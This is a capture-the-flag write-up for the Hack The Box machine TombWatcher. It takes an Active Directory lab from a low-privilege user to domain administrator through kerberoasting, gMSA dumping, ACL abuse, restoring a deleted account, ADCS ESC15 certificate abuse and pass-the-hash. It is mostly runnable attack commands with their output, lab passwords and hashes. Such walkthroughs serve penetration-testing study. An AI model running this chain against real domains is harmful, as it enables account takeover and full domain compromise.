---
layout: post
title: "HTB AD Medium: TombWatcher"
description: "TombWatcher is a Medium rated AD machine on HTB."
categories: [CTF,HTB]
tags: [AD,Medium]
author: g
---

## Nmap Scan
```bash
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49691/tcp open  unknown          syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49711/tcp open  unknown          syn-ack ttl 127
49714/tcp open  unknown          syn-ack ttl 127
49737/tcp open  unknown          syn-ack ttl 127
```

### Assumed Breach
```
henry:H3nry_987TGV!
```

### Enumerate Domain
Run Python ingestor for BloodHound:
```bash
bloodhound-ce-python -c all -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -ns 10.10.11.72
```

Outbound object control:
![Pasted image 20250901154429.png](/images/Pasted image 20250901154429.png){: .normal }


We can perform a kerberoast attack after first configuring an SPN on the target account: [Link](https://notes.benheater.com/books/active-directory/page/kerberoasting#bkmrk-abuse-writespn-from-).
```bash
# Configure SPN
ldapmodify -x -D 'henry@tombwatcher.htb' -w 'H3nry_987TGV!' -H ldap://dc01.tombwatcher.htb <<EOF
dn: CN=ALFRED,CN=USERS,DC=TOMBWATCHER,DC=HTB
changetype: modify
add: servicePrincipalName
servicePrincipalName: pwn/pwn
EOF

modifying entry "CN=ALFRED,CN=USERS,DC=TOMBWATCHER,DC=HTB"

# Fix clock skew
timedatectl set-ntp off
sudo rdate -n 10.10.11.72

# Get hash
impacket-GetUserSPNs 'tombwatcher.htb/henry:H3nry_987TGV!' -dc-ip 10.10.11.72 -request-user 'Alfred'

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$dc7fa41116061c6a386599e3e33fb085$128df3c2b199bb9a9b6461187ab33c158fbe18b325916181d2a8508e67f665172d6f1fd38e7c88b48470cdb95270f2ba0882e28604b7561906686973b3d63d4a87ad858963d71778aaba875774e4dad7af42547c224a97ae0dd298e4e38bbcf31528035b311eefe1d7b77b7071ac622966898f0bb5477f450dcb6ff77f167d37d3cd4d3fd8f154a4a9c2bd09117f493d6d3f5130f8da79e2bca915c36d444190e435f3257bf433d84ac09dea314b5e981bf005cc40ca01e24bc85bdcfa7391c86aba65cd8e791b533489875081d0d511c7c2b727755b6478affc75a43ce01713712f0655c3cf213df4467f7abfee6db6cbfcfa9d20eee0b285e4e1666c718fa2cfd50f6b7c5f9e6f77b7b450b6d5de60292bc626880c871ae8a5b64a0a6f2c26d338cac59edea82f46eedc9635eecfc91c6895593e0fc5ba4a0755054541832f2585b2d59cdd286931dec69334380114bb9e772394d3eb093768b9e4f2955c0be9b6483061d912728a0f45d97ff401dc9bf35bc00d84a7cfb79ee74c260d521f232d4bdc15e8a3d9bc6f51c3d309d701671e8038fbe0e7097432ba78b2004b7f98e0d95eddc8419a3aca958b89f4a02392256cf9dfee33065dd673eac026e3a461a23e572e9beb5d011a63889065f9892204a1dbac1baa254e8a4bd7dfb245beedb71c19d528d31b4315571a6b9e1cfac0c39659050e807e417e7fad9731060fa201f4b880f95fb67847518d408e02fb32bb6d3933576ac395a19052d729bec77715ce0e4dbac472582daf3a972f07afe1372f03ff03cc0bcaf92642c1a2cf2b043edc99f8c3edcc71962fdd03213a3d3440a81a9ef3999f2f78951e1c4dd22b50c0992c56b46a0556cc0f44654aa9acae3b7e5ea730671a8c39cb11565e2f41327a5dc2b236d7c9ee2cd54d52e04c7a0aebf221f47d4d31baf5710b802cb919067e2fe38635a170c17e0f691514c77f921057e69eada55f91ff9b2dfd62370c0536279847312c2119b3b98c5409fc747fbb4ea9aa0ed2e97da04f3e7723ee3bd6d41d5c90ee4f09ca63812feffd8b8fc008ce268f59d674338b655a92a321c71aa588f89a58964b830db249d389292b089c704e8ed404b4c4d3689dd00b646825422ae340e4f77b7222d62ae0012c24b9b6b90645077284046a48d9b907e07a656d9f1dd6e1423ab00a6ff136e0bb84f0e3b19d6fe8c7f1b8f1245096dd62b9e949f3a0211c26ceb318c6c8487c856de57c76f5e71a510af46bb8a129b2b6efc77cd2dc0c72eb710b18cf02624051e740731fbeeaad730f0d0d13e974040fbe702e990bd29d01c53b81655d825b42053916173f42148df006cf5bfe2c041e6ac507fb673b0fb80033a64fa0322e22f94221e1f36393a593f0b1792b4b51b043672d941ca95bc2c2261e0335afd13219b3745b56498d663037ade1bf568f3442949d253e0e9dded14cfeb6ee9b5aec9d1661411ee6
```

This hash cracks:
```bash
john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2025-09-01 20:08) 25.00g/s 25600p/s 25600c/s 25600C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


### Lateral movement
This user can add itself to the infrastructure group:
![Pasted image 20250901161009.png](/images/Pasted image 20250901161009.png){: .normal }


Add alfred to the infrastructure group:
```bash
# add.ldif
dn: CN=INFRASTRUCTURE,CN=USERS,DC=TOMBWATCHER,DC=HTB
changetype: modify
add: member
member: CN=ALFRED,CN=USERS,DC=TOMBWATCHER,DC=HTB

# Run query (Pass: basketball)
ldapmodify -x -H ldap://dc01.tombwatcher.htb -D "alfred@tombwatcher.htb" -W -f add.ldif 

# Verify user was added:
net rpc group members "infrastructure" -U "tombwatcher.htb"/"alfred"%"basketball" -S "10.10.11.72"    
 
TOMBWATCHER\Alfred
```
> net rpc method wasn't working!
{: .prompt-warning }


### Lateral movement
We can now read the GMSA password of the ansible_dev$ account:
![Pasted image 20250901162848.png](/images/Pasted image 20250901162848.png){: .normal }


Read the password: [Link](https://github.com/micahvandeusen/gMSADumper).
```bash
# Install
cd /tmp
git clone https://github.com/micahvandeusen/gMSADumper.git
cd gMSADumper
pip3 install -r requirements.txt --break-system-packages

# Usage
python3 gMSADumper.py -u 'alfred' -p 'basketball' -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::ecb4146b3f99e6bbf06ca896f504227c
ansible_dev$:aes256-cts-hmac-sha1-96:dae98d218c6a20033dd7e1c6bcf37cde9a7c04a41cfa4a89091bf4c487f2f39a
ansible_dev$:aes128-cts-hmac-sha1-96:0ec1712577c58adc29a193d53fc73bd4
```


### Lateral movement
This user has ForceChangePassword perms over the Sam user:
![Pasted image 20250901163930.png](/images/Pasted image 20250901163930.png){: .normal }


Abuse:
```bash
pth-net rpc password "sam" "newP@ssword2022" -U "tombwatcher.htb"/"ansible_dev$"%"ecb4146b3f99e6bbf06ca896f504227c":"ecb4146b3f99e6bbf06ca896f504227c" -S "10.10.11.72"
```


### Lateral movement
This user has WriteOwner perms against the John user:
![Pasted image 20250901164059.png](/images/Pasted image 20250901164059.png){: .normal }


Abuse:
```bash
# Change ownership
impacket-owneredit -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam':'newP@ssword2022' -dc-ip 10.10.11.72
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!

# Add GenericWrite perms
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'newP@ssword2022' -dc-ip 10.10.11.72
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250901-164323.bak
[*] DACL modified successfully!

# Lastly force a password change
net rpc password "john" "newP@ssword2022" -U "tombwatcher.htb"/"sam"%"newP@ssword2022" -S "10.10.11.72"
```

Evil-winrm as this user:
```bash
evil-winrm -i 10.10.11.72 -u john -p 'newP@ssword2022'
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\john\Documents> whoami
tombwatcher\john
```

User.txt: `9a2ecfc636c04ce5b30840e099edf501`
```bash
type user.txt
9a2ecfc636c04ce5b30840e099edf501
```


### Lateral Movement
We have GenericAll permissions over an OU:
![Pasted image 20250901164424.png](/images/Pasted image 20250901164424.png){: .normal }


Create a new ACE on the OU that will inherit objects under the OU:
```bash
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'newP@ssword2022' -dc-ip 10.10.11.72
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250901-164850.bak
[*] DACL modified successfully!
```

Since the OU appears to be empty, we can list deleted users:
```bash
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects

Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

Restore the deleted cert_admin account:
```bash
Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"

# Verify
Get-ADUser -Identity "cert_admin" | Select-Object Name, Enabled
```

Since we modified the OU in which the cert_admin user resides, it inherited the GenericAll privileges, meaning we can modify it's password:
```bash
net rpc password "cert_admin" "newP@ssword2022" -U "tombwatcher.htb"/"john"%"newP@ssword2022" -S "10.10.11.72"
```


### Privilege Escalation
Enumerate ADCS:
```bash
certipy-ad find -u 'cert_admin' -p 'newP@ssword2022' -dc-ip 10.10.11.72 -vulnerable -enabled

cat 20250901171024_Certipy.txt                                                              
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

Guide: [Link](https://www.hackingarticles.in/adcs-esc15-exploiting-template-schema-v1/).
```bash
# Install certipy
cd /tmp
git clone -b esc15-ekuwu --single-branch https://github.com/dru1d-foofus/Certipy
cd Certipy
sudo python3 setup.py install

# Request a cert for the cert_admin user
certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'newP@ssword2022' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'

# Request a cert for the DA
certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'newP@ssword2022' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'tombwatcher\Administrator'
```

Use the obtained administrator PFX file:
```bash
# Fix clock skew
timedatectl set-ntp off
sudo rdate -n 10.10.11.72

# Get TGT
certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@tombwatcher.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:251fdbe55df2e3eb3ab27433177e0ff5
```

Authenticate:
```bash
evil-winrm -i 10.10.11.72 -u Administrator -H '251fdbe55df2e3eb3ab27433177e0ff5'
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
tombwatcher\administrator
```

Root.txt: `0c1eeb1a46b343090bff61dddb7d7025`
```bash
type root.txt
0c1eeb1a46b343090bff61dddb7d7025
```


### PWNED!!
![Pasted image 20250901173619.png](/images/Pasted image 20250901173619.png){: .normal }